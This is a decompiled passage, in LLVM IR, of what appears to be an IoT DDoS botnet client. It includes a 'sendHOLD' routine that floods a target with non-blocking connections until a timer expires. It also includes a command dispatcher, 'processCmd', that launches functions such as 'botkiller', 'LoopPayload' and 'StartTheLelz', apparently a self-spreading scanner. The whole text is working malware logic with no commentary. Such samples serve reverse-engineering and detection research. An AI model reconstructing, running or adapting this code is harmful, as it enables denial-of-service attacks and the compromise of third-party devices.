  %v3_11218 = icmp eq i32 %v5_11210, -1
  br i1 %v3_11218, label %dec_label_pc_11220, label %dec_label_pc_11268

dec_label_pc_11220:                               ; preds = %dec_label_pc_111e8
  %v0_11220 = call i32 @__errno_location()
  %v1_11228 = inttoptr i32 %v0_11220 to i32*
  %v2_11228 = load i32, i32* %v1_11228, align 4
  %v7_1122c = icmp eq i32 %v2_11228, 11
  br i1 %v7_1122c, label %dec_label_pc_11268, label %dec_label_pc_11234

dec_label_pc_11234:                               ; preds = %dec_label_pc_11220
  store i32 %storemerge251, i32* %r2.global-to-local, align 4
  %v7_1123c = load i32, i32* %v6_111fc, align 4
  %v1_11244 = call i32 @__libc_close(i32 %v7_1123c)
  store i32 %v2_10f04, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_10f08, align 4
  br label %dec_label_pc_11268

dec_label_pc_11268:                               ; preds = %dec_label_pc_10f28, %dec_label_pc_111a4, %dec_label_pc_111e8, %dec_label_pc_11220, %dec_label_pc_111b0, %dec_label_pc_11180, %dec_label_pc_11148, %dec_label_pc_10ff0, %dec_label_pc_10fd8, %dec_label_pc_11234
  %v1_1126c = add nuw nsw i32 %storemerge251, 1
  store i32 %v1_1126c, i32* %r2.global-to-local, align 4
  %v5_11280 = icmp slt i32 %v1_1126c, %v3_10dc4
  br i1 %v5_11280, label %dec_label_pc_10ef0, label %dec_label_pc_11284

dec_label_pc_11284:                               ; preds = %dec_label_pc_11274.preheader, %dec_label_pc_11268, %dec_label_pc_10e24
  %v2_11288 = call i32 @__GI_time(i32* null)
  store i32 %v2_11288, i32* %r2.global-to-local, align 4
  %v5_11298 = icmp slt i32 %v2_11288, %v2_10ed8
  br i1 %v5_11298, label %dec_label_pc_11274.preheader, label %dec_label_pc_1129c

dec_label_pc_11274.preheader:                     ; preds = %dec_label_pc_11284
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_1127c48, label %dec_label_pc_10ef0, label %dec_label_pc_11284

dec_label_pc_1129c:                               ; preds = %dec_label_pc_11284, %entry
  %v12_112a4 = phi i32 [ %v3_10e10, %entry ], [ %v2_11288, %dec_label_pc_11284 ]
  %v2_112a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_112a4, i32* @r4, align 4
  store i32 %v6_10d94, i32* @fp, align 4
  ret i32 %v12_112a4

; uselistorder directives
  uselistorder i32 %v1_1126c, { 2, 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i8* %v1_10f08, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_10f04, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v3_10efc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge251, { 0, 8, 7, 6, 5, 4, 3, 2, 1, 12, 11, 10, 9, 13 }
  uselistorder i32 %v2_11014, { 3, 2, 0, 1 }
  uselistorder i32 %v1_10ea8, { 1, 0, 2 }
  uselistorder i32 %v3_10e68, { 0, 1, 5, 2, 3, 4, 7, 6 }
  uselistorder i32 %v3_10dc4, { 1, 2, 0 }
  uselistorder i32 %v0_10db4, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 33, 30, 29, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 31, 32, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 2, 1, 0 }
  uselistorder i32 -176, { 1, 0 }
  uselistorder label %dec_label_pc_11268, { 9, 3, 2, 4, 1, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_11028, { 1, 0 }
  uselistorder label %dec_label_pc_10fd8, { 1, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_112ac = load i32, i32* @r4, align 4
  store i32 %v3_112ac, i32* %stack_var_-20, align 4
  %v6_112ac = load i32, i32* @fp, align 4
  %v0_112cc = call i32 @getdtablesize()
  %tmp = icmp slt i32 %v0_112cc, 0
  %v3_112d4 = zext i1 %tmp to i32
  %v2_112d8 = add i32 %v3_112d4, %v0_112cc
  %v3_112dc = sdiv i32 %v2_112d8, 2
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v3_112fc = urem i32 %arg2, 65536
  %v1_11304 = call i32 @htons(i32 %v3_112fc)
  %v3_11328 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  %v2_11330 = icmp eq i32 %v3_11328, 0
  br i1 %v2_11330, label %dec_label_pc_1133c, label %dec_label_pc_1185c

dec_label_pc_1133c:                               ; preds = %entry
  %v16_112ac = ptrtoint i32* %stack_var_-20 to i32
  %v3_11358 = mul i32 %v3_112dc, 8
  %v1_1135c = or i32 %v3_11358, 3
  %v1_11360 = add i32 %v1_1135c, 3
  %v3_11364 = and i32 %v1_11360, -4
  %v1_1136c = load i32, i32* @sp, align 4
  %v2_1136c = sub i32 %v1_1136c, %v3_11364
  %v1_1137c = add i32 %v2_1136c, 7
  %v3_11380 = and i32 %v1_1137c, -4
  %v2_113a4 = mul i32 %v3_112dc, 5
  store i32 %v2_113a4, i32* @r2, align 4
  %v2_113b8 = inttoptr i32 %v3_11380 to i8*
  %v3_113b8 = call i32 @__GI_memset(i8* %v2_113b8, i32 0)
  %v1_113c0 = call i32 @malloc(i32 1024)
  store i32 1024, i32* @r2, align 4
  %v2_113dc = inttoptr i32 %v1_113c0 to i8*
  %v3_113dc = call i32 @__GI_memset(i8* %v2_113dc, i32 0)
  %v2_113e4 = call i32 @__GI_time(i32* null)
  store i32 %v2_113e4, i32* %r2.global-to-local, align 4
  %v2_113f0 = add i32 %v2_113e4, %arg3
  %v2_1152c = ptrtoint i32* %stack_var_-204 to i32
  %v2_115f0 = ptrtoint i32* %stack_var_-212 to i32
  %v2_11638 = ptrtoint i32* %stack_var_-216 to i32
  %v3_114cc = bitcast i32* %stack_var_-76 to %sockaddr*
  %v8_1183c57 = icmp sgt i32 %v2_112d8, 1
  %v2_11418 = add i32 %v3_11380, 4
  %v2_11588 = add i32 %v16_112ac, -184
  br label %dec_label_pc_11844

dec_label_pc_11408:                               ; preds = %dec_label_pc_11834.preheader, %dec_label_pc_11828
  %storemerge360 = phi i32 [ %v1_1182c, %dec_label_pc_11828 ], [ 0, %dec_label_pc_11834.preheader ]
  store i32 %v3_11380, i32* %r2.global-to-local, align 4
  %v3_11414 = mul i32 %storemerge360, 8
  %v2_1141c = add i32 %v2_11418, %v3_11414
  %v1_11420 = inttoptr i32 %v2_1141c to i8*
  %v2_11420 = load i8, i8* %v1_11420, align 4
  %v6_1142c = icmp eq i8 %v2_11420, 0
  %v7_1142c = icmp eq i8 %v2_11420, 1
  br i1 %v7_1142c, label %dec_label_pc_11540.lr.ph, label %dec_label_pc_11434

dec_label_pc_11434:                               ; preds = %dec_label_pc_11408
  %v7_11438 = icmp eq i8 %v2_11420, 2
  br i1 %v7_11438, label %dec_label_pc_11714.lr.ph, label %dec_label_pc_11440

dec_label_pc_11440:                               ; preds = %dec_label_pc_11434
  br i1 %v6_1142c, label %dec_label_pc_11450, label %dec_label_pc_11828

dec_label_pc_11450:                               ; preds = %dec_label_pc_11440
  store i32 %storemerge360, i32* @r4, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_11460 = call i32 @socket()
  %v2_1146c = load i32, i32* @r4, align 4
  %v5_1146c = mul i32 %v2_1146c, 8
  %v6_1146c = add i32 %v5_1146c, %v3_11380
  %v7_1146c = inttoptr i32 %v6_1146c to i32*
  store i32 %v0_11460, i32* %v7_1146c, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v5_11478 = add i32 %v3_11414, %v3_11380
  %v6_11478 = inttoptr i32 %v5_11478 to i32*
  %v7_11478 = load i32, i32* %v6_11478, align 4
  store i32 %v7_11478, i32* @r4, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_11484 = load i32, i32* %v6_11478, align 4
  store i32 0, i32* @r2, align 4
  %v2_11494 = call i32 @__libc_fcntl(i32 %v7_11484, i32 3)
  %v1_1149c = or i32 %v2_11494, 2048
  %v0_114a0 = load i32, i32* @r4, align 4
  store i32 %v1_1149c, i32* @r2, align 4
  %v2_114ac = call i32 @__libc_fcntl(i32 %v0_114a0, i32 4)
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_114b8 = load i32, i32* %v6_11478, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_114cc = call i32 @__libc_connect(i32 %v7_114b8, %sockaddr* %v3_114cc, i32 16)
  %v3_114d4 = icmp eq i32 %v4_114cc, -1
  br i1 %v3_114d4, label %dec_label_pc_114dc, label %dec_label_pc_114f0

dec_label_pc_114dc:                               ; preds = %dec_label_pc_11450
  %v0_114dc = call i32 @__errno_location()
  %v1_114e4 = inttoptr i32 %v0_114dc to i32*
  %v2_114e4 = load i32, i32* %v1_114e4, align 4
  %v7_114e8 = icmp eq i32 %v2_114e4, 115
  br i1 %v7_114e8, label %dec_label_pc_11508, label %dec_label_pc_114f0

dec_label_pc_114f0:                               ; preds = %dec_label_pc_11450, %dec_label_pc_114dc
  store i32 %v3_11380, i32* %r2.global-to-local, align 4
  %v7_114f8 = load i32, i32* %v6_11478, align 4
  %v1_11500 = call i32 @__libc_close(i32 %v7_114f8)
  br label %dec_label_pc_11828

dec_label_pc_11508:                               ; preds = %dec_label_pc_114dc
  store i32 %v2_1141c, i32* %r2.global-to-local, align 4
  store i8 1, i8* %v1_11420, align 4
  br label %dec_label_pc_11828

dec_label_pc_11540.lr.ph:                         ; preds = %dec_label_pc_11408
  br label %dec_label_pc_11540

dec_label_pc_11540:                               ; preds = %dec_label_pc_11540.lr.ph, %dec_label_pc_11540
  %storemerge513 = phi i32 [ 0, %dec_label_pc_11540.lr.ph ], [ %v1_11554, %dec_label_pc_11540 ]
  store i32 %v2_1152c, i32* %r2.global-to-local, align 4
  %v5_1154c = mul nuw nsw i32 %storemerge513, 4
  %v6_1154c = add i32 %v5_1154c, %v2_1152c
  %v7_1154c = inttoptr i32 %v6_1154c to i32*
  store i32 0, i32* %v7_1154c, align 4
  %v1_11554 = add nuw nsw i32 %storemerge513, 1
  %tmp50 = icmp ult i32 %v1_11554, 32
  br i1 %tmp50, label %dec_label_pc_11540, label %dec_label_pc_11568

dec_label_pc_11568:                               ; preds = %dec_label_pc_11540
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v5_11570 = add i32 %v3_11414, %v3_11380
  %v6_11570 = inttoptr i32 %v5_11570 to i32*
  %v7_11570 = load i32, i32* %v6_11570, align 4
  %v3_11574 = udiv i32 %v7_11570, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_11580 = mul nuw nsw i32 %v3_11574, 4
  %v2_1158c = add i32 %v2_11588, %v3_11580
  %v1_11590 = inttoptr i32 %v2_1158c to i32*
  %v2_11590 = load i32, i32* %v1_11590, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_1159c = load i32, i32* %v6_11570, align 4
  %v1_115a0 = urem i32 %v7_1159c, 32
  %v6_115a8 = shl i32 1, %v1_115a0
  %v2_115ac = or i32 %v6_115a8, %v2_11590
  store i32 %v2_115ac, i32* %v1_11590, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_115e4 = load i32, i32* %v6_11570, align 4
  %v1_115e8 = add i32 %v7_115e4, 1
  store i32 %v1_115e8, i32* %r2.global-to-local, align 4
  %v1_115f4 = load i32, i32* @sp, align 4
  %v2_115f4 = inttoptr i32 %v1_115f4 to i32*
  store i32 %v2_115f0, i32* %v2_115f4, align 4
  %v0_115f8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v2_1152c, i32* %r2.global-to-local, align 4
  %v4_11608 = load i32, i32* %stack_var_-212, align 4
  %v5_11608 = call i32 @__libc_select(i32 %v0_115f8, i32 0, i32 %v2_1152c, i32 0, i32 %v4_11608)
  %v7_11618 = icmp eq i32 %v5_11608, 1
  br i1 %v7_11618, label %dec_label_pc_11620, label %dec_label_pc_116bc

dec_label_pc_11620:                               ; preds = %dec_label_pc_11568
  store i32 4, i32* %stack_var_-216, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_11630 = load i32, i32* %v6_11570, align 4
  store i32 %v7_11630, i32* %r2.global-to-local, align 4
  %v1_1163c = load i32, i32* @sp, align 4
  %v2_1163c = inttoptr i32 %v1_1163c to i32*
  store i32 %v2_11638, i32* %v2_1163c, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_11650 = call i32 @getsockopt()
  %v3_11654 = load i32, i32* %stack_var_-220, align 4
  %v2_11658 = icmp eq i32 %v3_11654, 0
  br i1 %v2_11658, label %dec_label_pc_11698, label %dec_label_pc_11660

dec_label_pc_11660:                               ; preds = %dec_label_pc_11620
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_11668 = load i32, i32* %v6_11570, align 4
  %v1_11670 = call i32 @__libc_close(i32 %v7_11668)
  store i32 %v2_1141c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11420, align 4
  br label %dec_label_pc_11828

dec_label_pc_11698:                               ; preds = %dec_label_pc_11620
  store i32 %v2_1141c, i32* %r2.global-to-local, align 4
  store i8 2, i8* %v1_11420, align 4
  br label %dec_label_pc_11828

dec_label_pc_116bc:                               ; preds = %dec_label_pc_11568
  %v3_116c0 = icmp eq i32 %v5_11608, -1
  br i1 %v3_116c0, label %dec_label_pc_116c8, label %dec_label_pc_11828

dec_label_pc_116c8:                               ; preds = %dec_label_pc_116bc
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_116d0 = load i32, i32* %v6_11570, align 4
  %v1_116d8 = call i32 @__libc_close(i32 %v7_116d0)
  store i32 %v2_1141c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11420, align 4
  br label %dec_label_pc_11828

dec_label_pc_11714.lr.ph:                         ; preds = %dec_label_pc_11434
  br label %dec_label_pc_11714

dec_label_pc_11714:                               ; preds = %dec_label_pc_11714.lr.ph, %dec_label_pc_11714
  %storemerge49 = phi i32 [ 0, %dec_label_pc_11714.lr.ph ], [ %v1_11728, %dec_label_pc_11714 ]
  store i32 %v2_1152c, i32* %r2.global-to-local, align 4
  %v5_11720 = mul nuw nsw i32 %storemerge49, 4
  %v6_11720 = add i32 %v5_11720, %v2_1152c
  %v7_11720 = inttoptr i32 %v6_11720 to i32*
  store i32 0, i32* %v7_11720, align 4
  %v1_11728 = add nuw nsw i32 %storemerge49, 1
  %tmp51 = icmp ult i32 %v1_11728, 32
  br i1 %tmp51, label %dec_label_pc_11714, label %dec_label_pc_1173c

dec_label_pc_1173c:                               ; preds = %dec_label_pc_11714
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v5_11744 = add i32 %v3_11414, %v3_11380
  %v6_11744 = inttoptr i32 %v5_11744 to i32*
  %v7_11744 = load i32, i32* %v6_11744, align 4
  %v3_11748 = udiv i32 %v7_11744, 32
  store i32 -184, i32* %r2.global-to-local, align 4
  %v3_11754 = mul nuw nsw i32 %v3_11748, 4
  %v2_11760 = add i32 %v2_11588, %v3_11754
  %v1_11764 = inttoptr i32 %v2_11760 to i32*
  %v2_11764 = load i32, i32* %v1_11764, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_11770 = load i32, i32* %v6_11744, align 4
  %v1_11774 = urem i32 %v7_11770, 32
  %v6_1177c = shl i32 1, %v1_11774
  %v2_11780 = or i32 %v6_1177c, %v2_11764
  store i32 %v2_11780, i32* %v1_11764, align 4
  store i32 0, i32* %stack_var_-212, align 4
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_117b8 = load i32, i32* %v6_11744, align 4
  %v1_117bc = add i32 %v7_117b8, 1
  store i32 %v1_117bc, i32* %r2.global-to-local, align 4
  %v1_117c8 = load i32, i32* @sp, align 4
  %v2_117c8 = inttoptr i32 %v1_117c8 to i32*
  store i32 %v2_115f0, i32* %v2_117c8, align 4
  %v0_117cc = load i32, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v4_117dc = load i32, i32* %stack_var_-212, align 4
  %v5_117dc = call i32 @__libc_select(i32 %v0_117cc, i32 0, i32 0, i32 %v2_1152c, i32 %v4_117dc)
  %v2_117ec = icmp eq i32 %v5_117dc, 0
  br i1 %v2_117ec, label %dec_label_pc_11828, label %dec_label_pc_117f4

dec_label_pc_117f4:                               ; preds = %dec_label_pc_1173c
  store i32 %storemerge360, i32* %r2.global-to-local, align 4
  %v7_117fc = load i32, i32* %v6_11744, align 4
  %v1_11804 = call i32 @__libc_close(i32 %v7_117fc)
  store i32 %v2_1141c, i32* %r2.global-to-local, align 4
  store i8 0, i8* %v1_11420, align 4
  br label %dec_label_pc_11828

dec_label_pc_11828:                               ; preds = %dec_label_pc_11440, %dec_label_pc_116bc, %dec_label_pc_1173c, %dec_label_pc_116c8, %dec_label_pc_11698, %dec_label_pc_11660, %dec_label_pc_11508, %dec_label_pc_114f0, %dec_label_pc_117f4
  %v1_1182c = add nuw nsw i32 %storemerge360, 1
  store i32 %v1_1182c, i32* %r2.global-to-local, align 4
  %v5_11840 = icmp slt i32 %v1_1182c, %v3_112dc
  br i1 %v5_11840, label %dec_label_pc_11408, label %dec_label_pc_11844

dec_label_pc_11844:                               ; preds = %dec_label_pc_11834.preheader, %dec_label_pc_11828, %dec_label_pc_1133c
  %v2_11848 = call i32 @__GI_time(i32* null)
  store i32 %v2_11848, i32* %r2.global-to-local, align 4
  %v5_11858 = icmp slt i32 %v2_11848, %v2_113f0
  br i1 %v5_11858, label %dec_label_pc_11834.preheader, label %dec_label_pc_1185c

dec_label_pc_11834.preheader:                     ; preds = %dec_label_pc_11844
  store i32 0, i32* %r2.global-to-local, align 4
  br i1 %v8_1183c57, label %dec_label_pc_11408, label %dec_label_pc_11844

dec_label_pc_1185c:                               ; preds = %dec_label_pc_11844, %entry
  %v12_11864 = phi i32 [ %v3_11328, %entry ], [ %v2_11848, %dec_label_pc_11844 ]
  %v2_11864 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11864, i32* @r4, align 4
  store i32 %v6_112ac, i32* @fp, align 4
  ret i32 %v12_11864

; uselistorder directives
  uselistorder i32 %v1_1182c, { 2, 1, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i32 %storemerge513, { 1, 0 }
  uselistorder i8* %v1_11420, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v2_1141c, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %v3_11414, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge360, { 0, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 14, 13, 12, 11, 15 }
  uselistorder i32 %v2_1152c, { 2, 0, 3, 6, 5, 1, 4 }
  uselistorder i32 %v3_11380, { 0, 1, 5, 2, 3, 4, 7, 6 }
  uselistorder i32 %v3_112dc, { 1, 2, 0 }
  uselistorder i32 %v0_112cc, { 1, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-212, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r2.global-to-local, { 39, 36, 35, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 37, 38, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 8, 2, 4, 3, 1, 0 }
  uselistorder i32 115, { 1, 2, 0, 3, 4 }
  uselistorder i32 -184, { 1, 2, 0 }
  uselistorder i32 ()* @getdtablesize, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11828, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_11714, { 1, 0 }
  uselistorder label %dec_label_pc_11540, { 1, 0 }
  uselistorder label %dec_label_pc_114f0, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_11868 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_11868, i32* @ip, align 4
  %v3_1186c = load i32, i32* @r4, align 4
  %v6_1186c = load i32, i32* @r5, align 4
  %v9_1186c = load i32, i32* @r6, align 4
  %v12_1186c = load i32, i32* @r7, align 4
  %v15_1186c = load i32, i32* @r8, align 4
  %v18_1186c = load i32, i32* @fp, align 4
  store i32 71796, i32* %stack_var_-4, align 4
  %v2_11870 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11870, i32* @fp, align 4
  %v2_11884 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1c3e4.56 to i32), i32* @r1, align 4
  %v3_11890 = inttoptr i32 %v2_11884 to i8*
  %v4_11890 = call i32 @__GI_strcoll(i8* %v3_11890, i32 ptrtoint ([5 x i8]* @global_var_1c3e4.56 to i32))
  %v2_11898 = icmp eq i32 %v4_11890, 0
  br i1 %v2_11898, label %dec_label_pc_118a0, label %dec_label_pc_118b8

dec_label_pc_118a0:                               ; preds = %entry
  %v2_118a4 = load i32, i32* @global_var_28c44.54, align 4
  %v3_118b0 = call i32 @HackerPrint(i32 %v2_118a4, i32 ptrtoint ([6 x i8]* @global_var_1ee48.762 to i32))
  br label %dec_label_pc_12be0

dec_label_pc_118b8:                               ; preds = %entry
  %v2_118bc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1ee50.764 to i32), i32* @r1, align 4
  %v3_118c8 = inttoptr i32 %v2_118bc to i8*
  %v4_118c8 = call i32 @__GI_strcoll(i8* %v3_118c8, i32 ptrtoint ([11 x i8]* @global_var_1ee50.764 to i32))
  %v2_118d0 = icmp eq i32 %v4_118c8, 0
  br i1 %v2_118d0, label %dec_label_pc_118d8, label %dec_label_pc_11904

dec_label_pc_118d8:                               ; preds = %dec_label_pc_118b8
  %v2_118dc = load i32, i32* @global_var_28c44.54, align 4
  store i32 %v2_118dc, i32* @r4, align 4
  %v2_118e4 = load i32, i32* @global_var_2eebc.478, align 4
  store i32 %v2_118e4, i32* @r0, align 4
  %v1_118e8 = call i32 @__GI_inet_ntoa(i32 %v2_118e4)
  %v0_118f0 = load i32, i32* @r4, align 4
  store i32 %v1_118e8, i32* @r2, align 4
  %v3_118fc = call i32 @HackerPrint(i32 %v0_118f0, i32 ptrtoint ([10 x i8]* @global_var_1ee5c.767 to i32))
  br label %dec_label_pc_12be0

dec_label_pc_11904:                               ; preds = %dec_label_pc_118b8
  %v2_11908 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1ee68.769 to i32), i32* @r1, align 4
  %v3_11914 = inttoptr i32 %v2_11908 to i8*
  %v4_11914 = call i32 @__GI_strcoll(i8* %v3_11914, i32 ptrtoint ([8 x i8]* @global_var_1ee68.769 to i32))
  %v2_1191c = icmp eq i32 %v4_11914, 0
  br i1 %v2_1191c, label %dec_label_pc_11924, label %dec_label_pc_11958

dec_label_pc_11924:                               ; preds = %dec_label_pc_11904
  %v0_11924 = call i32 @listFork()
  %v2_1192c = icmp eq i32 %v0_11924, 0
  br i1 %v2_1192c, label %dec_label_pc_11934, label %dec_label_pc_11958

dec_label_pc_11934:                               ; preds = %dec_label_pc_11924
  %v2_11938 = load i32, i32* @global_var_28c44.54, align 4
  %v3_11944 = call i32 @HackerPrint(i32 %v2_11938, i32 ptrtoint ([13 x i8]* @global_var_1ee70.771 to i32))
  %v1_11948 = call i32 @botkiller(i32 %v3_11944)
  %v1_1194c = call i32 @RemoveTMP(i32 %v1_11948)
  %v1_11954 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11958:                               ; preds = %dec_label_pc_11924, %dec_label_pc_11904
  %v2_1195c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1ee80.773 to i32), i32* @r1, align 4
  %v3_11968 = inttoptr i32 %v2_1195c to i8*
  %v4_11968 = call i32 @__GI_strcoll(i8* %v3_11968, i32 ptrtoint ([7 x i8]* @global_var_1ee80.773 to i32))
  %v2_11970 = icmp eq i32 %v4_11968, 0
  br i1 %v2_11970, label %dec_label_pc_11978, label %dec_label_pc_119a8

dec_label_pc_11978:                               ; preds = %dec_label_pc_11958
  %v0_11978 = call i32 @listFork()
  %v2_11980 = icmp eq i32 %v0_11978, 0
  br i1 %v2_11980, label %dec_label_pc_11988, label %dec_label_pc_119a8

dec_label_pc_11988:                               ; preds = %dec_label_pc_11978
  %v2_1198c = load i32, i32* @global_var_28c44.54, align 4
  %v3_11998 = call i32 @HackerPrint(i32 %v2_1198c, i32 ptrtoint ([16 x i8]* @global_var_1ee88.775 to i32))
  %v1_1199c = call i32 @LoopPayload(i32 %v3_11998)
  %v1_119a4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_119a8:                               ; preds = %dec_label_pc_11978, %dec_label_pc_11958
  %v2_119ac = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1ee98.777 to i32), i32* @r1, align 4
  %v3_119b8 = inttoptr i32 %v2_119ac to i8*
  %v4_119b8 = call i32 @__GI_strcoll(i8* %v3_119b8, i32 ptrtoint ([7 x i8]* @global_var_1ee98.777 to i32))
  %v2_119c0 = icmp eq i32 %v4_119b8, 0
  br i1 %v2_119c0, label %dec_label_pc_119c8, label %dec_label_pc_11ac8

dec_label_pc_119c8:                               ; preds = %dec_label_pc_119a8
  %v7_119cc = icmp eq i32 %arg1, 2
  br i1 %v7_119cc, label %dec_label_pc_119ec, label %dec_label_pc_119d4

dec_label_pc_119d4:                               ; preds = %dec_label_pc_119c8
  %v2_119d8 = load i32, i32* @global_var_28c44.54, align 4
  %v3_119e4 = call i32 @HackerPrint(i32 %v2_119d8, i32 ptrtoint ([16 x i8]* @global_var_1eea0.779 to i32))
  br label %dec_label_pc_12be0

dec_label_pc_119ec:                               ; preds = %dec_label_pc_119c8
  %v1_119f0 = add i32 %tmp, 4
  %v1_119f4 = inttoptr i32 %v1_119f0 to i32*
  %v2_119f4 = load i32, i32* %v1_119f4, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1eeb0.781 to i32), i32* @r1, align 4
  %v3_11a00 = inttoptr i32 %v2_119f4 to i8*
  %v4_11a00 = call i32 @__GI_strcoll(i8* %v3_11a00, i32 ptrtoint ([4 x i8]* @global_var_1eeb0.781 to i32))
  %v2_11a08 = icmp eq i32 %v4_11a00, 0
  br i1 %v2_11a08, label %dec_label_pc_11a10, label %dec_label_pc_11a54

dec_label_pc_11a10:                               ; preds = %dec_label_pc_119ec
  %v2_11a14 = load i32, i32* @global_var_2eec4.783, align 4
  %v2_11a18 = icmp eq i32 %v2_11a14, 0
  br i1 %v2_11a18, label %dec_label_pc_12be0, label %dec_label_pc_11a20

dec_label_pc_11a20:                               ; preds = %dec_label_pc_11a10
  %v0_11a30 = call i32 @kill()
  %v2_11a38 = load i32, i32* @global_var_28c44.54, align 4
  %v3_11a44 = call i32 @HackerPrint(i32 %v2_11a38, i32 ptrtoint ([5 x i8]* @global_var_1eeb4.785 to i32))
  store i32 0, i32* @global_var_2eec4.783, align 4
  br label %dec_label_pc_11a54

dec_label_pc_11a54:                               ; preds = %dec_label_pc_119ec, %dec_label_pc_11a20
  %v2_11a5c = load i32, i32* %v1_119f4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1eebc.787 to i32), i32* @r1, align 4
  %v3_11a68 = inttoptr i32 %v2_11a5c to i8*
  %v4_11a68 = call i32 @__GI_strcoll(i8* %v3_11a68, i32 ptrtoint ([3 x i8]* @global_var_1eebc.787 to i32))
  %v2_11a70 = icmp eq i32 %v4_11a68, 0
  br i1 %v2_11a70, label %dec_label_pc_11a78, label %dec_label_pc_11ac8

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a54
  %v2_11a7c = load i32, i32* @global_var_2eec4.783, align 4
  %v2_11a80 = icmp eq i32 %v2_11a7c, 0
  br i1 %v2_11a80, label %dec_label_pc_11a88, label %dec_label_pc_12be0

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a78
  %v0_11a88 = call i32 @__libc_fork()
  %v2_11a98 = icmp eq i32 %v0_11a88, 0
  br i1 %v2_11a98, label %dec_label_pc_11abc, label %dec_label_pc_11aa0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11a88
  store i32 %v0_11a88, i32* @global_var_2eec4.783, align 4
  br label %dec_label_pc_12be0

dec_label_pc_11abc:                               ; preds = %dec_label_pc_11a88
  %v0_11abc = call i32 @StartTheLelz()
  %v1_11ac4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_11ac8:                               ; preds = %dec_label_pc_11a54, %dec_label_pc_119a8
  %v2_11acc = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1eec0.789 to i32), i32* @r1, align 4
